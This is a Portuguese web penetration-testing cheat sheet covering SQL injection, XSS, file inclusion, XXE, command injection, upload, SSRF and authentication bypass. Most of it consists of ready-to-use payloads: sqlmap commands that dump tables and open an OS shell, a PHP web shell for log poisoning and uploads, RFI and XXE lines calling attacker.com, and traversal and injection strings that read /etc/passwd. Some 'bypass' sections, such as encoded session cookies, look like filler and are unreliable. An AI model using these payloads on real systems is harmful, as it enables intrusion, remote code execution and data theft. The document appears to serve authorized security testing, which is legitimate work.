
## 1. SQL Injection (SQLi)

### 1.1 Detecção Básica
```bash
# Teste básico com aspas
' OR 1=1--
" OR 1=1--

# Teste com comentários
' OR 1=1#
" OR 1=1#

# Teste com operadores
' OR 1=1 AND 1=1--
" OR 1=1 AND 1=1--
```

### 1.2 Detecção Avançada
```bash
# Teste com diferentes tipos de dados
' OR 1=1--
' OR 1=1#
' OR 1=1;--
' OR 1=1;#

# Teste com funções
' OR LENGTH('test')=4--
' OR ASCII('A')=65--
' OR SUBSTRING('test',1,1)='t'--
```

### 1.3 Blind SQL Injection
```bash
# Time-based
' OR SLEEP(5)--
' OR (SELECT SLEEP(5))--

# Boolean-based
' OR 1=1 AND 1=1--
' OR 1=1 AND 1=2--
```

### 1.4 Union-based SQL Injection
```bash
# Descobrir número de colunas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Union injection
' UNION SELECT 1,2,3--
' UNION SELECT NULL,NULL,NULL--
```

### 1.5 SQLMap
```bash
# Detecção básica
sqlmap -u "http://target.com/page.php?id=1" --dbs

# Detecção com parâmetros
sqlmap -u "http://target.com/page.php?id=1" -p id --dbs

# Detecção com POST
sqlmap -u "http://target.com/login.php" --data "user=admin&pass=admin" --dbs

# Detecção com cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie "session=abc123" --dbs

# Extrair dados
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name -C column_name --dump

# Shell interativo
sqlmap -u "http://target.com/page.php?id=1" --os-shell
```

## 2. Cross-Site Scripting (XSS)

### 2.1 Detecção Básica
```html
# Teste básico
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Teste com encoding
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;
```

### 2.2 XSS Refletido
```html
# Teste em parâmetros GET
http://target.com/search.php?q=<script>alert('XSS')</script>

# Teste em parâmetros POST
<form action="http://target.com/search.php" method="POST">
<input name="q" value="<script>alert('XSS')</script>">
</form>
```

### 2.3 XSS Armazenado
```html
# Teste em campos de entrada
<script>alert('XSS')</script>

# Teste em comentários
<!-- <script>alert('XSS')</script> -->

# Teste em uploads
<script>alert('XSS')</script>
```

### 2.4 XSS DOM
```javascript
# Teste em JavaScript
document.location.hash = "<script>alert('XSS')</script>"
window.location.hash = "<script>alert('XSS')</script>"
```

### 2.5 Bypass de Filtros
```html
# Bypass com encoding
%3Cscript%3Ealert('XSS')%3C/script%3E
&lt;script&gt;alert('XSS')&lt;/script&gt;

# Bypass com caracteres especiais
<ScRiPt>alert('XSS')</ScRiPt>
<script>alert(String.fromCharCode(88,83,83))</script>

# Bypass com eventos
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

## 3. Local File Inclusion (LFI)

### 3.1 Detecção Básica
```bash
# Teste básico
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts

# se o parametro não contiver a extensão do arquiv, ela é setada pelo php, ai tem que testar com o null byte: %00
# Ex: file=/etc/passwd%00

# Teste com encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# ao conseguir ler os logs da aplicação, verificar possibilidade de SSH log poison, PHP log poison, Identificar diretórios e arquivos que retornaram 200 e não foram identificados só com o gobuster
```

### 3.2 Bypass de Filtros
```bash
# Bypass com encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts

# Bypass com caracteres especiais
....//....//....//etc/passwd
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd


# Bypass com null byte
../../../etc/passwd%00
..\..\..\windows\system32\drivers\etc\hosts%00

```

### 3.3 Log Poisoning
```bash
# Injetar código PHP nos logs
<?php system($_GET['cmd']); ?>

# Acessar logs
../../../var/log/apache2/access.log
..\..\..\windows\system32\drivers\etc\hosts
```

### 3.4 PHP Wrappers
```bash
# PHP wrapper
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
php://filter/read=convert.base64-encode/resource=..\..\..\windows\system32\drivers\etc\hosts

# Data wrapper
data://text/plain,<?php system($_GET['cmd']); ?>
```

## 4. Remote File Inclusion (RFI)

### 4.1 Detecção Básica
```bash
# Teste básico
http://attacker.com/shell.php
https://attacker.com/shell.php

# Teste com diferentes protocolos
ftp://attacker.com/shell.php
file://attacker.com/shell.php
```

### 4.2 Bypass de Filtros
```bash
# Bypass com encoding
http%3A%2F%2Fattacker.com%2Fshell.php
https%3A%2F%2Fattacker.com%2Fshell.php

# Bypass com caracteres especiais
http://attacker.com/shell.php?
https://attacker.com/shell.php#
```

## 5. XML External Entity (XXE)

### 5.1 Detecção Básica
```xml
# Teste básico
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### 5.2 XXE com DTD Externo
```xml
# DTD externo
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
<root></root>
```

### 5.3 XXE Blind
```xml
# XXE blind
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "http://attacker.com/log.php?data=test">
%xxe;
]>
<root></root>
```

## 6. Command Injection

Usar a wordlist: /usr/share/seclists/Fuzzing/command-injection-commix.txt
com o BURP
### 6.1 Detecção Básica
```bash
# Teste básico
; ls
| ls
& ls
&& ls
|| ls

# Teste com comandos
; whoami
| whoami
& whoami
&& whoami
|| whoami
```

### 6.2 Bypass de Filtros
```bash
# Bypass com encoding
%3B%20ls
%7C%20ls
%26%20ls

# Bypass com caracteres especiais
`ls`
$(ls)
${ls}
```

### 6.3 Teste em Diferentes Sistemas
```bash
# Linux
; ls -la
| cat /etc/passwd
& id
&& uname -a

# Windows
; dir
| type C:\windows\system32\drivers\etc\hosts
& whoami
&& systeminfo
```

## 7. File Upload Vulnerabilities

### 7.1 Detecção Básica
```bash
# Teste com diferentes extensões
shell.php
shell.php5
shell.php3
shell.phtml
shell.phar
```

### 7.2 Bypass de Filtros
```bash
# Bypass com null byte
shell.php%00.jpg
shell.php%00.png

# Bypass com double extension
shell.php.jpg
shell.php.png

# Bypass com case sensitivity
shell.PhP
shell.PHP
```

### 7.3 Upload de Shell
```php
# Shell PHP básica
<?php system($_GET['cmd']); ?>

# Shell PHP avançada
<?php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

## 8. Directory Traversal

### 8.1 Detecção Básica
```bash
# Teste básico
../../../etc/passwd
..\..\..\windows\system32\drivers\etc\hosts

# Teste com encoding
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

### 8.2 Bypass de Filtros
```bash
# Bypass com caracteres especiais
....//....//....//etc/passwd
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts

# Bypass com null byte
../../../etc/passwd%00
..\..\..\windows\system32\drivers\etc\hosts%00
```

## 9. Server-Side Request Forgery (SSRF)

### 9.1 Detecção Básica
```bash
# Teste básico
http://localhost:22
http://127.0.0.1:22
http://0.0.0.0:22

# Teste com diferentes protocolos
file:///etc/passwd
ftp://localhost
gopher://localhost:22
```

### 9.2 Bypass de Filtros
```bash
# Bypass com encoding
http%3A%2F%2Flocalhost%3A22
http%3A%2F%2F127.0.0.1%3A22

# Bypass com caracteres especiais
http://localhost:22/
http://127.0.0.1:22/
```

## 10. Insecure Direct Object References (IDOR)

### 10.1 Detecção Básica
```bash
# Teste com diferentes IDs
/user?id=1
/user?id=2
/user?id=3

# Teste com diferentes parâmetros
/file?id=1
/file?id=2
/file?id=3
```

### 10.2 Bypass de Filtros
```bash
# Bypass com encoding
%2Fuser%3Fid%3D1
%2Ffile%3Fid%3D1

# Bypass com caracteres especiais
/user?id=1&
/file?id=1#
```

## 11. Authentication Bypass

### 11.1 Detecção Básica
```bash
# Teste com credenciais padrão
admin:admin
admin:password
admin:123456
root:root
root:password
```

### 11.2 Bypass de Filtros
```bash
# Bypass com SQL injection
admin' OR 1=1--
admin' OR 1=1#
admin' OR 1=1;--

# Bypass com encoding
admin%27%20OR%201%3D1--
admin%27%20OR%201%3D1#
```

## 12. Session Management

### 12.1 Detecção Básica
```bash
# Teste com diferentes sessões
session=abc123
session=def456
session=ghi789

# Teste com diferentes cookies
cookie=abc123
cookie=def456
cookie=ghi789
```

### 12.2 Bypass de Filtros
```bash
# Bypass com encoding
session%3Dabc123
cookie%3Dabc123

# Bypass com caracteres especiais
session=abc123&
cookie=abc123#
```

## 13. Checklist de Validação

- [ ] SQL Injection testado
- [ ] XSS testado
- [ ] LFI testado
- [ ] RFI testado
- [ ] XXE testado
- [ ] Command Injection testado
- [ ] File Upload testado
- [ ] Directory Traversal testado
- [ ] SSRF testado
- [ ] IDOR testado
- [ ] Authentication Bypass testado
- [ ] Session Management testado
- [ ] Resultados documentados

## 14. Ferramentas Complementares

### 14.1 Burp Suite
```bash
# Configurar proxy
# Interceptar requisições
# Analisar respostas
# Usar extensões
```

### 14.2 OWASP ZAP
```bash
# Varredura automática
# Teste manual
# Análise de vulnerabilidades
```

### 14.3 Nikto
```bash
# Varredura básica
nikto -h http://target.com

# Varredura com plugins
nikto -h http://target.com -Plugins all
```

## 15. Dicas Importantes

1. **Sempre testar manualmente** antes de usar ferramentas
2. **Usar múltiplas técnicas** de bypass
3. **Documentar descobertas** para o relatório
4. **Verificar logs** do servidor
5. **Testar em diferentes navegadores**
6. **Usar encoding** quando necessário
7. **Verificar filtros** de segurança
8. **Priorizar vulnerabilidades** baseado no impacto
